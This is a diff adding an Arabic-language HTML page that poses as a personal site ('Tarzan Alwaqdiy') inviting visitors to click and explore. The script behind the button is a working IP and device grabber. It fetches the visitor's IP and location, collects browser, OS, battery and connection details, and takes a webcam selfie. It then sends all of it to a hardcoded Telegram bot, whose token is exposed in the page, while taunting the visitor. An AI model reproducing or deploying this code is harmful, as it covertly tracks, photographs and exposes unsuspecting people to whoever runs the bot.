@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Tarzan Alwaqdiy - الظلال المرعبة</title>
+<style>
+  body, html {
+    margin: 0; padding: 0; height: 100%;
+    background: black;
+    font-family: 'Courier New', monospace;
+    color: #0f0;
+    overflow: hidden;
+  }
+  @keyframes matrix {
+    0% {background-position: 0 0;}
+    100% {background-position: 0 100%;}
+  }
+  body::before {
+    content: "";
+    position: fixed;
+    top: 0; left: 0; width: 100%; height: 100%;
+    background: url('https://i.ibb.co/WB0KN0b/matrix.png') repeat;
+    opacity: 0.1;
+    animation: matrix 10s linear infinite;
+    z-index: 0;
+  }
+  #home {
+    position: fixed;
+    top: 0; left: 0; width: 100%; height: 100%;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    z-index: 10;
+    background: rgba(0,0,0,0.85);
+    text-align: center;
+  }
+  #home h1 {
+    font-size: 4rem;
+    color: #f00;
+    text-shadow: 0 0 15px #ff0000, 0 0 30px #ff0000;
+    user-select: none;
+    animation: flicker 1.5s infinite alternate;
+  }
+  @keyframes flicker {
+    0%, 100% {opacity: 1;}
+    50% {opacity: 0.6;}
+  }
+  #home p {
+    font-size: 1.5rem;
+    color: #ff3300;
+    margin-bottom: 40px;
+    user-select: none;
+    text-shadow: 0 0 8px #ff3300;
+  }
+  #startBtn {
+    padding: 15px 35px;
+    font-size: 1.3rem;
+    background: #f00;
+    border: none;
+    color: white;
+    border-radius: 6px;
+    cursor: pointer;
+    box-shadow: 0 0 15px #f00;
+    transition: background-color 0.3s ease;
+  }
+  #startBtn:hover {
+    background-color: #a00;
+    box-shadow: 0 0 25px #f00;
+  }
+  #infoPage {
+    display: none;
+    position: fixed;
+    top: 0; left: 0; width: 100%; height: 100%;
+    background: rgba(0,0,0,0.95);
+    overflow-y: auto;
+    padding: 30px;
+    box-sizing: border-box;
+    z-index: 20;
+  }
+  #infoPage h2 {
+    color: #f00;
+    font-size: 2.5rem;
+    margin-bottom: 20px;
+    text-align: center;
+    text-shadow: 0 0 20px #ff0000;
+  }
+  .info-box {
+    background: rgba(0, 0, 0, 0.85);
+    border: 2px solid #f00;
+    border-radius: 10px;
+    margin: 15px auto;
+    max-width: 600px;
+    padding: 15px 25px;
+    box-shadow: 0 0 25px #ff0000;
+    font-size: 1.2rem;
+    line-height: 1.6;
+    color: #0f0;
+    word-break: break-word;
+  }
+  .info-box strong {
+    color: #ff3300;
+  }
+  #flag {
+    display: block;
+    margin: 10px auto 25px auto;
+    width: 150px;
+    border: 2px solid #f00;
+    border-radius: 8px;
+    box-shadow: 0 0 20px #ff0000;
+  }
+  #selfieContainer {
+    text-align: center;
+    margin: 20px auto;
+  }
+  #selfieImage {
+    border: 3px solid #f00;
+    border-radius: 10px;
+    box-shadow: 0 0 20px #ff0000;
+    max-width: 300px;
+    width: 100%;
+    height: auto;
+    display: none;
+  }
+</style>
+</head>
+<body>
+
+<div id="home">
+  <h1>Tarzan Alwaqdiy</h1>
+  <p>اهلآ بك في موقع Tarzanalwaqdiy يمكنك الضغط علا الزر لتصفح واختبار قدراتي</p>
+  <button id="startBtn">دخول وتصفح</button>
+</div>
+
+<div id="infoPage">
+  <h/>تمت مراقبتك يا جحش😈</h2>
+  <img id="flag" alt="علم الدولة" />
+  <div class="info-box" id="ipInfo"><strong>IP:</strong> جاري التحميل...</div>
+  <div class="info-box" id="cityInfo"><strong>المدينة:</strong> جاري التحميل...</div>
+  <div class="info-box" id="countryInfo"><strong>الدولة:</strong> جاري التحميل...</div>
+  <div class="info-box" id="osInfo"><strong>نظام التشغيل:</strong> جاري التحميل...</div>
+  <div class="info-box" id="browserInfo"><strong>المتصفح:</strong> جاري التحميل...</div>
+  <div class="info-box" id="deviceTypeInfo"><strong>نوع الجهاز:</strong> جاري التحميل...</div>
+  <div class="info-box" id="screenInfo"><strong>دقة الشاشة:</strong> جاري التحميل...</div>
+  <div class="info-box" id="languageInfo"><strong>اللغة المفضلة:</strong> جاري التحميل...</div>
+  <div class="info-box" id="connectionInfo"><strong>نوع الاتصال:</strong> جاري التحميل...</div>
+  <div class="info-box" id="batteryInfo"><strong>مستوى البطارية:</strong> جاري التحميل...</div>
+  <div class="info-box" id="cameraSupportInfo"><strong>دعم الكاميرا:</strong> جاري التحقق...</div>
+  <div class="info-box" id="timeInfo"><strong>التاريخ والوقت الحالي:</strong> جاري التحميل...</div>
+  <div class="info-box" id="onlineStatusInfo"><strong>حالة الاتصال:</strong> جاري التحميل...</div>
+
+  <div id="selfieContainer">
+    <img id="selfieImage" alt="صورتك" />
+  </div>
+</div>
+
+<script>
+  const startBtn = document.getElementById('startBtn');
+  const home = document.getElementById('home');
+  const infoPage = document.getElementById('infoPage');
+  const selfieImage = document.getElementById('selfieImage');
+
+  // بيانات تخزين النتائج
+  const results = {};
+
+  startBtn.onclick = () => {
+    home.style.display = 'none';
+    infoPage.style.display = 'block';
+    fetchData();
+    takeSelfie();
+  };
+
+  async function fetchData() {
+    try {
+      // بيانات IP والموقع
+      const res = await fetch('https://ipapi.co/json/');
+      const data = await res.json();
+
+      results.ip = data.ip || 'غير متوفر';
+      results.city = data.city || 'غير متوفر';
+      results.country = data.country_name || 'غير متوفر';
+      results.country_code = data.country_code || '';
+
+      document.getElementById('ipInfo').innerHTML = `<strong>IP:</strong> ${results.ip}`;
+      document.getElementById('cityInfo').innerHTML = `<strong>المدينة:</strong> ${results.city}`;
+      document.getElementById('countryInfo').innerHTML = `<strong>الدولة:</strong> ${results.country}`;
+
+      const flagUrl = results.country_code ? `https://flagcdn.com/w320/${results.country_code.toLowerCase()}.png` : '';
+      const flagImg = document.getElementById('flag');
+      if(flagUrl) {
+        flagImg.src = flagUrl;
+        flagImg.alt = `علم ${results.country}`;
+        flagImg.style.display = 'block';
+      } else {
+        flagImg.style.display = 'none';
+      }
+    } catch (error) {
+      results.ip = 'تعذر جلب بيانات الـ IP';
+      results.city = '-';
+      results.country = '-';
+      document.getElementById('ipInfo').textContent = results.ip;
+      document.getElementById('cityInfo').textContent = '';
+      document.getElementById('countryInfo').textContent = '';
+      document.getElementById('flag').style.display = 'none';
+    }
+
+    // نظام التشغيل (تحليل userAgent)
+    const ua = navigator.userAgent;
+    let os = "غير معروف";
+    if (/Windows NT 10/.test(ua)) os = "ويندوز 10";
+    else if (/Windows NT 6.3/.test(ua)) os = "ويندوز 8.1";
+    else if (/Windows NT 6.2/.test(ua)) os = "ويندوز 8";
+    else if (/Windows NT 6.1/.test(ua)) os = "ويندوز 7";
+    else if (/Mac OS X/.test(ua)) os = "ماك";
+    else if (/Android/.test(ua)) os = "أندرويد";
+    else if (/iPhone|iPad|iPod/.test(ua)) os = "iOS";
+
+    results.os = os;
+    document.getElementById('osInfo').innerHTML = `<strong>نظام التشغيل:</strong> ${os}`;
+
+    // المتصفح
+    let browser = "غير معروف";
+    if (ua.indexOf("Firefox") > -1) browser = "فايرفوكس";
+    else if (ua.indexOf("Chrome") > -1) browser = "كروم";
+    else if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") === -1) browser = "سفاري";
+    else if (ua.indexOf("MSIE") > -1 || ua.indexOf("Trident") > -1) browser = "إنترنت إكسبلورر";
+    else if (ua.indexOf("Edge") > -1) browser = "إيدج";
+
+    results.browser = browser;
+    document.getElementById('browserInfo').innerHTML = `<strong>المتصفح:</strong> ${browser}`;
+
+    // نوع الجهاز (هاتف أم كمبيوتر)
+    const isMobile = /Mobi|Android/i.test(navigator.userAgent);
+    results.deviceType = isMobile ? 'جوال' : 'كمبيوتر';
+    document.getElementById('deviceTypeInfo').innerHTML = `<strong>نوع الجهاز:</strong> ${results.deviceType}`;
+
+    // دقة الشاشة
+    const screenRes = `${window.screen.width} × ${window.screen.height}`;
+    results.screenRes = screenRes;
+    document.getElementById('screenInfo').innerHTML = `<strong>دقة الشاشة:</strong> ${screenRes}`;
+
+    // اللغة المفضلة
+    const lang = navigator.language || navigator.userLanguage;
+    results.language = lang;
+    document.getElementById('languageInfo').innerHTML = `<strong>اللغة المفضلة:</strong> ${lang}`;
+
+    // نوع الاتصال (شبكة الإنترنت)
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    let connectionType = 'غير معروف';
+    if(connection && connection.effectiveType) {
+      connectionType = connection.effectiveType;
+    }
+    results.connectionType = connectionType;
+    document.getElementById('connectionInfo').innerHTML = `<strong>نوع الاتصال:</strong> ${connectionType}`;
+
+    // مستوى البطارية
+    if(navigator.getBattery) {
+      try {
+        const battery = await navigator.getBattery();
+        const level = Math.round(battery.level * 100) + '%';
+        results.batteryLevel = level;
+        document.getElementById('batteryInfo').innerHTML = `<strong>مستوى البطارية:</strong> ${level}`;
+      } catch {
+        results.batteryLevel = 'غير متوفر';
+        document.getElementById('batteryInfo').innerHTML = `<strong>مستوى البطارية:</strong> غير متوفر`;
+      }
+    } else {
+      results.batteryLevel = 'غير مدعوم';
+      document.getElementById('batteryInfo').innerHTML = `<strong>مستوى البطارية:</strong> غير مدعوم`;
+    }
+
+    // دعم الكاميرا
+    try {
+      await navigator.mediaDevices.getUserMedia({ video: true });
+      results.cameraSupport = "مدعوم";
+      document.getElementById('cameraSupportInfo').innerHTML = `<strong>دعم الكاميرا:</strong> مدعوم`;
+    } catch {
+      results.cameraSupport = "غير مدعوم";
+      document.getElementById('cameraSupportInfo').innerHTML = `<strong>دعم الكاميرا:</strong> غير مدعوم`;
+    }
+
+    // التاريخ والوقت الحالي
+    const now = new Date();
+    results.currentTime = now.toLocaleString();
+    document.getElementById('timeInfo').innerHTML = `<strong>التاريخ والوقت الحالي:</strong> ${results.currentTime}`;
+
+    // حالة الاتصال بالإنترنت
+    const onlineStatus = navigator.onLine ? "متصل" : "غير متصل";
+    results.onlineStatus = onlineStatus;
+    document.getElementById('onlineStatusInfo').innerHTML = `<strong>حالة الاتصال:</strong> ${onlineStatus}`;
+
+    // بعد جمع كل البيانات، أرسلها إلى بوت التليجرام
+    sendToTelegram();
+  }
+
+  async function takeSelfie() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+
+      await new Promise(resolve => {
+        video.onloadedmetadata = () => resolve();
+      });
+
+      // التقاط صورة السيلفي
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      // إيقاف الكاميرا
+      stream.getTracks().forEach(track => track.stop());
+
+      // عرض الصورة في الصفحة
+      const selfieDataUrl = canvas.toDataURL('image/png');
+      selfieImage.src = selfieDataUrl;
+      selfieImage.style.display = 'block';
+
+      // حفظ رابط الصورة في النتائج لإرسالها لاحقاً
+      results.selfie = selfieDataUrl;
+
+      // إرسال الصورة إلى تيليجرام بعد رفعها (رفع الصورة يجب أن يتم عبر API تليجرام)
+      sendPhotoToTelegram(selfieDataUrl);
+
+    } catch (error) {
+      console.warn("لم يتم التقاط صورة السيلفي:", error);
+      results.selfie = "غير متوفرة";
+    }
+  }
+
+  function sendToTelegram() {
+    const token = '8121146327:AAG0Olg8qLQ_UvF1U6-DlLKugOgluGeRxu0';
+    const chat_id = '7210057243';
+
+    let message = `🕵️‍♂️ *معلومات الجهاز والاتصال:*\n\n`;
+    message += `🌐 IP: ${results.ip}\n`;
+    message += `🏙️ المدينة: ${results.city}\n`;
+    message += `🇸🇦 الدولة: ${results.country}\n`;
+    message += `🖥️ نظام التشغيل: ${results.os}\n`;
+    message += `🌍 المتصفح: ${results.browser}\n`;
+    message += `📱 نوع الجهاز: ${results.deviceType}\n`;
+    message += `🖥️ دقة الشاشة: ${results.screenRes}\n`;
+    message += `🗣️ اللغة: ${results.language}\n`;
+    message += `📶 نوع الاتصال: ${results.connectionType}\n`;
+    message += `🔋 مستوى البطارية: ${results.batteryLevel}\n`;
+    message += `📷 دعم الكاميرا: ${results.cameraSupport}\n`;
+    message += `🕒 الوقت الحالي: ${results.currentTime}\n`;
+    message += `📡 حالة الاتصال: ${results.onlineStatus}\n`;
+
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&parse_mode=Markdown&text=${encodeURIComponent(message)}`;
+
+    fetch(url).then(response => response.json())
+      .then(data => {
+        if(!data.ok) console.warn("خطأ في إرسال الرسالة:", data.description);
+      })
+      .catch(err => console.error("خطأ في طلب إرسال الرسالة:", err));
+  }
+
+  function sendPhotoToTelegram(dataUrl) {
+    const token = '8121146327:AAG0Olg8qLQ_UvF1U6-DlLKugOgluGeRxu0';
+    const chat_id = '7210057243';
+
+    // تحويل dataURL إلى Blob
+    function dataURLtoBlob(dataurl) {
+      var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+          bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+      while(n--) {
+          u8arr[n] = bstr.charCodeAt(n);
+      }
+      return new Blob([u8arr], {type:mime});
+    }
+
+    const blob = dataURLtoBlob(dataUrl);
+
+    // رفع الصورة يحتاج POST مع formData
+    const formData = new FormData();
+    formData.append('chat_id', chat_id);
+    formData.append('photo', blob, 'selfie.png');
+
+    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+      method: 'POST',
+      body: formData
+    }).then(response => response.json())
+      .then(data => {
+        if(!data.ok) console.warn("خطأ في إرسال الصورة:", data.description);
+      })
+      .catch(err => console.error("خطأ في طلب إرسال الصورة:", err));
+  }
+</script>
+</body>
+</html>
+      
